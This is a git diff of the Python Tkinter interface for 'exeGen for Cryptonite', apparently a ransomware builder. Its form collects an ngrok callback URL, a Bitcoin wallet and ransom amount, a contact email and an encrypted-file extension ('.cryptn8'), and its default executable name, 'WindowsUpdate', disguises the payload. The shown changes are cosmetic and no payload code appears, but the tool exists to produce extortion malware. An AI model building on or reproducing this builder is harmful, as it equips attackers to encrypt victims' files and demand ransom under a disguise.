@@ -15,7 +15,7 @@ def selectfolder():
         filesave.destroy()
         folder_frm.config(text = f"{folder}")
     
-        restore_btn = ttk.Button(master = window, text = "Change Folder", style = "TButton", command = selectfolder)
+        restore_btn = tk.Button(master = window, image = image4, command = selectfolder, borderwidth = 0)
         restore_btn.grid(row = 8, column = 0, pady = 20, sticky = "n", columnspan = 2)
 
 def generate():
@@ -53,6 +53,7 @@ def generate():
 
 window = tk.Tk()
 window.config(bg="white")
+window.title("exeGen for Cryptonite")
 window.rowconfigure([0,1,2,3,4,5,6], minsize = 30, weight = 0)
 window.rowconfigure([8], minsize = 100, weight = 1)
 window.resizable(0,0)
@@ -67,44 +68,49 @@ s.configure("W.TButton", font = (("arial", 24)))
 image0 = Image.open("exegen.png")
 image0 = image0.resize((round(image0.size[0]*0.5),round(image0.size[1]*0.5)))
 image0 = ImageTk.PhotoImage(image0)
-
 image1 = Image.open("generatebutton.png")
-image1 = image1.resize((round(image1.size[0]*0.7),round(image1.size[1]*0.7)))
+image1 = image1.resize((round(image1.size[0]*0.9),round(image1.size[1]*0.9)))
 image1 = ImageTk.PhotoImage(image1)
+image3 = Image.open("selectfolder.png")
+image3 = image3.resize((round(image3.size[0]*0.3),round(image3.size[1]*0.3)))
+image3 = ImageTk.PhotoImage(image3)
+image4 = Image.open("changefolder.png")
+image4 = image4.resize((round(image4.size[0]*0.3),round(image4.size[1]*0.3)))
+image4 = ImageTk.PhotoImage(image4)
 
 
 title = tk.Label(master = window, image = image0, bg = "black")
 title.grid(row = 0, column = 0, columnspan = 2, pady = (20, 30), padx = 15)
 
-name = tk.Label(master = window, text = "NAME (for exe file): ", font = ("arial", 15))
+name = tk.Label(master = window, text = "NAME (for exe file): ", font = ("arial", 15), fg = "black", bg = "white")
 name.grid(row = 1, column = 0, sticky = "e", pady = 20, padx = 15)
-name_entry = tk.Entry(window, font = ("arial", 15))
+name_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
 name_entry.grid(row = 1, column = 1, sticky = "w", pady = 20, padx = 15)
 name_entry.insert("0", "WindowsUpdate")
 
-url = tk.Label(master = window, text = "NGROK URL: ", font = ("arial", 15))
+url = tk.Label(master = window, text = "NGROK URL: ", font = ("arial", 15), fg = "black", bg = "white")
 url.grid(row = 2, column = 0, sticky = "e", pady = 20, padx = 15)
-url_entry = tk.Entry(window, font = ("arial", 15))
+url_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
 url_entry.grid(row = 2, column = 1, sticky = "w", pady = 20, padx = 15)
 
-btcw = tk.Label(master = window, text = "BTC WALLET ADDRESS: ", font = ("arial", 15))
+btcw = tk.Label(master = window, text = "BTC WALLET ADDRESS: ", font = ("arial", 15), fg = "black", bg = "white")
 btcw.grid(row = 3, column = 0, sticky = "e", pady = 20, padx = 15)
-btcw_entry = tk.Entry(window, font = ("arial", 15))
+btcw_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
 btcw_entry.grid(row = 3, column = 1, sticky = "w", pady = 20, padx = 15)
 
-btcm = tk.Label(master = window, text = "BTC AMOUNT: ", font = ("arial", 15))
+btcm = tk.Label(master = window, text = "BTC AMOUNT: ", font = ("arial", 15), fg = "black", bg = "white")
 btcm.grid(row = 4, column = 0, sticky = "e", pady = 20, padx = 15)
-btcm_entry = tk.Entry(window, font = ("arial", 15))
+btcm_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
 btcm_entry.grid(row = 4, column = 1, sticky = "w", pady = 20, padx = 15)
 
-email = tk.Label(master = window, text = "EMAIL: ", font = ("arial", 15))
+email = tk.Label(master = window, text = "EMAIL: ", font = ("arial", 15), fg = "black", bg = "white")
 email.grid(row = 5, column = 0, sticky = "e", pady = 20, padx = 15)
-email_entry = tk.Entry(window, font = ("arial", 15))
+email_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
 email_entry.grid(row = 5, column = 1, sticky = "w", pady = 20, padx = 15)
 
-ext = tk.Label(master = window, text = "EXTENSION: ", font = ("arial", 15))
+ext = tk.Label(master = window, text = "EXTENSION: ", font = ("arial", 15), fg = "black", bg = "white")
 ext.grid(row = 6, column = 0, sticky = "e", pady = 20, padx = 15)
-ext_entry = tk.Entry(window, font = ("arial", 15))
+ext_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
 ext_entry.grid(row = 6, column = 1, sticky = "w", pady = 20, padx = 15)
 ext_entry.insert("0", ".cryptn8")
 
@@ -114,7 +120,7 @@ ext.grid(row = 7, column = 0, sticky = "e", pady = 5, padx = 15)
 folder_frm = tk.Label(master = window, text = f"..Folder path will appear here..", font = ("arial", 12))
 folder_frm.grid(row = 8, column = 0, sticky = "s", columnspan = 2, padx = 10, pady = 20)
 
-filesave = ttk.Button(master = window, style = "TButton", text = f"Select where to save exe file", command = selectfolder)
+filesave = tk.Button(master = window, image = image3, command = selectfolder, borderwidth = 0)
 filesave.grid(row = 8, column = 0, columnspan = 2, pady = 20, sticky = "n")
 
 generate_btn = tk.Button(master = window, image = image1, command = generate, borderwidth = 0)
